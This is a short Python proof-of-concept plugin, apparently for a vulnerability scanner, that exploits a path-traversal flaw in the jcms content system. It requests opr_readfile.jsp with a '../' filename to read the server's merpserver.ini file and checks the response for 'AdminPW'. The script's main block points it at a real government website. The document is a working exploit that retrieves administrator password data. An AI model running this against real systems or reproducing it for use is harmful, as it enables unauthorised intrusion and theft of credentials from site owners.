import re
def assign(service,arg):
    if service == "jcms":
        return True,arg
def audit(arg):
    payload = "jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename=../../../../../../WEB-INF/ini/merpserver.ini"
    url = arg + payload
    code ,head,res,body,_ = curl.curl(url)
    if code == 200 and 'AdminPW' in res:
        security_warning(url)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('jcms','http://anxiang.gov.cn/')[1])